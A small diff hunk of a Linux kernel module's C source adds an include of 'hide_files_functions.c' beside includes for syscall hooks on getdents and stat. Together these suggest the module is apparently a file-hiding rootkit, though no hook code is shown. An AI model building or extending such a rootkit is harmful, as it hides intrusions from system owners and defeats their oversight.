@@ -10,6 +10,7 @@
 #include <linux/module.h>
 
 #include "resources/hooks.h"
+#include "resources/hide_files_functions.c"
 
 #include "resources/getdents.c"
 #include "resources/stat.c"
